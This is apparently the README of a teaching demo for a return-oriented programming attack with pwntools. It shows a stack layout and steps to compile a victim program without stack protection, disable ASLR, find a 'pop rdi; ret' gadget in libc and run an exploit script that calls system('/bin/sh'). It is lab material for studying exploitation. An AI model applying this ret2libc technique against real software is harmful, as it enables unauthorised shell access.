This is a demo of ROP attack with pwntools.
Tested on Ubuntu 14.04 with Linux Linux 3.19.0-25-generic.

#### Stack Layout ####
    string /bin/sh
----------------------
    addr of system()
----------------------
    addr of /bin/sh
----------------------
 addr of pop rdi; ret
----------------------
     EBP Register
----------------------
     64 bytes buf
######################

1. Compile the code:
	$ gcc -fno-stack-protector -o victim victim.c

2. Disable ASLR: 
	$ echo 0 > /proc/sys/kernel/randomize_va_space 

3. Gadget "pop  %rdi ; retq" can be obtained via:
	$ ROPgadget --binary /lib/x86_64-linux-gnu/libc.so.6 --only "pop|ret" | grep rdi
Result: 0x0000000000022b1a : pop rdi ; ret
This is gadget_offset in exploit.py

4. Base address of libc text can be obtained via /proc/pid/maps, e.g., 0x7ffff7a15000 
This is the libc_addr in exploit.py

5. ./exploit.py
